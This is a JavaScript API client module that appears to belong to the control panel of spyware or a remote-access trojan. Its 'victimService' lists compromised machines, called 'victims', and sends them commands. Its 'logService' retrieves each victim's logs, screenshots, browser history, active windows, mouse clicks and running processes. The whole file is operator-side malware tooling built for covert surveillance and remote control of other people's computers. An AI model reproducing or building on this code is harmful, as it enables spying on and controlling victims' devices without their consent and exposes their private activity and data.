import axios from 'axios';

const API_BASE_URL = 'http://localhost:5000/api';

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: {
    'Content-Type': 'application/json',
  },
});

export const victimService = {
  getAllVictims: () => api.get('/victims'),
  getVictimById: (id) => api.get(`/victims/${id}`),
  sendCommand: (victimId, command) => api.post('/command', { victim_id: victimId, command }),
};

export const logService = {
  getLogsByVictim: (victimId, limit = 50) => api.get(`/logs/${victimId}?limit=${limit}`),
  getScreenshotsByVictim: (victimId, limit = 10) => api.get(`/screenshots/${victimId}?limit=${limit}`),
  getBrowserHistoryByVictim: (victimId, limit = 20) => api.get(`/browser-history/${victimId}?limit=${limit}`),
  getActiveWindowsByVictim: (victimId, limit = 30) => api.get(`/active-windows/${victimId}?limit=${limit}`),
  getMouseClicksByVictim: (victimId, limit = 50) => api.get(`/mouse-clicks/${victimId}?limit=${limit}`),
  getProcessesByVictim: (victimId) => api.get(`/processes/${victimId}`),
};

export default api;